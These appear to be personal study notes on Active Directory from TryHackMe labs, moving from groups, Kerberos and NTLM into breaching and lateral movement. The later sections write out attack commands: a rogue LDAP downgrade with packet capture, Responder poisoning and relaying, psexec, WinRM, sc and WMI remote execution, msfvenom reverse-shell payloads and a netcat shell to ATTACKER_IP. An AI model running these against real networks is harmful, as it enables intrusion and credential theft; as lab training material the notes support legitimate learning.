The machine accounts themselves are local administrators on the assigned computer, they are generally not supposed to be accessed by anyone except the computer itself, but as with any other account, if you have the password, you can use it to log in.

Security Groups

If you are familiar with Windows, you probably know that you can define user groups to assign access rights to files or other resources to entire groups instead of single users. This allows for better manageability as you can add users to an existing group, and they will automatically inherit all of the group's privileges. Security groups are also considered security principals and, therefore, can have privileges over resources on the network.

Groups can have both users and machines as members. If needed, groups can include other groups as well.

Several groups are created by default in a domain that can be used to grant specific privileges to users. As an example, here are some of the most important groups in a domain:
Security Group	Description
Domain Admins	Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs.
Server Operators	Users in this group can administer Domain Controllers. They cannot change any administrative group memberships.
Backup Operators	Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers.
Account Operators	Users in this group can create or modify other accounts in the domain.
Domain Users	Includes all existing user accounts in the domain.
Domain Computers	Includes all existing computers in the domain.
Domain Controllers	Includes all existing DCs on the domain.

This will open up a window where you can see the hierarchy of users, computers and groups that exist in the domain. These objects are organised in Organizational Units (OUs) which are container objects that allow you to classify users and machines. OUs are mainly used to define sets of users with similar policing requirements. The people in the Sales department of your organisation are likely to have a different set of policies applied than the people in IT, for example. Keep in mind that a user can only be a part of a single OU at a time.

 OUs are handy for applying policies to users and computers, which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn't make sense to try to apply two different sets of policies to a single user.
Security Groups, on the other hand, are used to grant permissions over resources. For example, you will use groups if you want to allow some users to access a shared folder or network printer. A user can be a part of many groups, which is needed to grant access to multiple resources.

## Kerberos
- Request starts with a client sending a username and timestamp encrypted by the client's pw hash to the Key distribution Center (KDC)
- KDC replies with Ticket Granting ticket (TGT) encrypted w/ krgbt account pw hash and session key encrypted w/ user hash
![[Pasted image 20221207193657.png]]
- User uses TGT and session key to request access to services. This way user doesn't need to resend credentials every time
- Now the user requests a Ticket granting service (TGS) to access services on the network. Service is specified by providing a Service Principal Name (SPN)
- User sends Username and timestamp encrypted with the session key, TGT, and  SPN ![[Pasted image 20221207193731.png]]
- KDC will send back the TGS encrypted w/ the service owner's hash and a service session key encrypted with the session key
- User then sends username and timestamp encrypted by service session key, and TGS to the Service Server to authenticate and access the service.
![[Pasted image 20221207193759.png]]

## NTLM Authentication

![[Pasted image 20221207194125.png]]
The client sends an authentication request to the server they want to access.
The server generates a random number and sends it as a challenge to the client.
The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
The server forwards the challenge and the response to the Domain Controller for verification.
The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
The server forwards the authentication result to the client.

Note that the user's password (or hash) is never transmitted through the network for security.

The simplest trust relationship that can be established is a one-way trust relationship. In a one-way trust, if Domain AAA trusts Domain BBB, this means that a user on BBB can be authorised to access resources on AAA:

## Breaching AD
Ways to infiltrate Active Directory and obtain a foothold
### ntlm and NetNTLM
ntlm can be a good place to try and brute force an initial set of AD credentials or try credential stuffing recovered credentials for lateral movement.
Most domain accounts will have password lockout so it is better to try one password (usually a recovered default password) with many usernames
We can use tools like Hydra or scripts to conduct password spraying attacks
### LDAP
LDAP is Lightweight directory Access Protocol. It's similar to mtlm, but the application verifies the credentials instead of passing them to a domain controler
If you gain access to third party apps that use LDAP it is possible the AD credentials are stored in a config file
We can also do LDAP pass back attacks
	Identify network devices that are using LDAP Authentication
	Set up a listener on port 389 --> this doesn't work, we need to host a rogue LDAP server
	Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:
		#olcSaslSecProps.ldif
		dn: cn=config
		replace: olcSaslSecProps
		olcSaslSecProps: noanonymous,minssf=0,passcred
	olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
    We can now run the server
```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
 If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:
 ```bash
 sudo tcpdump -SX -i <interface> tcp port 389
```
### Authentication Relays
Many Network services use NetNTLM or other authentication relays
One example is server Message Block (SMB)
	We can use Responder to attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Servier (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. These messages are all broadcast
	Responder tries to win the race condition in Authentication by replying to the requester first
	If successful we recieve the clients ntlm hash and we can try to crack it offline using hashcat or john the ripper
Relaying the Challenge
	We can also attempt to relay the challenge request
	We need SMB signing to be disabled or enabled but not enforced
	the associated account needs the proper privileges on the requested service --> ideally we want to relay the challenge of an account that has admin privileges over a server
	![[Pasted image 20230124225058.png]]

### Microsoft Deployment Toolkit


## Lateral Movement

### spawning processes remotely
Psexec
    Ports: 445/TCP (SMB)
    Required Group Memberships: Administrators
Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded here.

The way psexec works is as follows:
    Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
    Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
    Create some named pipes to handle stdin/stdout/stderr.
    To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run 
```cmd
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remote Process Creation Using WinRM

    Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:

winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

Enter-PSSession -Computername TARGET -Credential $credential

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

Remotely Creating Services Using sc

    Ports:
        135/TCP, 49152-65535/TCP (DCE/RPC)
        445/TCP (RPC over SMB Named Pipes)
        139/TCP (RPC over SMB Named Pipes)
    Required Group Memberships: Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

    A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

    svcctl via RPC
    If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

    svcctl via named pipe

We can create and start a service named "THMservice" using the following commands:

sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

To stop and delete the service, we can then execute the following commands:

sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice

In practice using sc.exe
	create reverse shell using the follwing command
	```bash
	msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
	```
	move onto target  machine
		in this case we pushed it to an SMB share with admin credentials
	Set up listener
	PROBLEM: Currently we cannot specify credentials as part of the sc.exe command. Therefore we cannot get our reverse shell to spawn with admin credentials.
	SOLUTION: We need to spawn a second reverse shell using the /netonly  admin credentials to be able to run the sc.exe command as our privileged user
	Command: runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:
THMJMP2: Command Prompt (As t1_leonard.summers)

C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249

### Moving laterally using WMI
We can perform many techniques by using WIndows Management Intrument (WMI)
Befroe using WMI we need to create a credential object in powershell
```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
We then choose the DCOM or Wsman protocol and create a session
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Remote Process Creation Using WMI

    Ports:
        135/TCP, 49152-65535/TCP (DCERPC)
        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```
Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 

In Practice
```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstallercd .msi
```
We then copy the payload using SMB or any other method available:
```bash
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

We start a handler to receive the reverse shell from Metasploit

Let's start a WMI session against THMIIS from a Powershell console:
THMJMP2: 
```powershell
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
We then invoke the Install method from the Win32_Product class to trigger the payload:
THMJMP2
```Powershell
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
As a result, you should receive a connection in your AttackBox from where you can access a flag on t1_corine.waters desktop.